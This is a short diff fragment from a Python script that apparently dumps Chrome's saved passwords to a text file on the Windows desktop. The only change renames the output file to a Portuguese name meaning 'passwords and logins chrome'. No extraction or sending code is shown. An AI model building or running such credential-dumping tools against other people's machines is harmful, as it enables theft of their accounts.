@@ -17,7 +17,7 @@ def get_desktop_path():
     ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
     return buf.value
 
-OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "ChromePasswords.txt")
+OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "senhaseloginschrome.txt")
 TEMP_DB_FILE = "temp_ChromePasswords.db"
 
 def get_profile_name(profile_path):
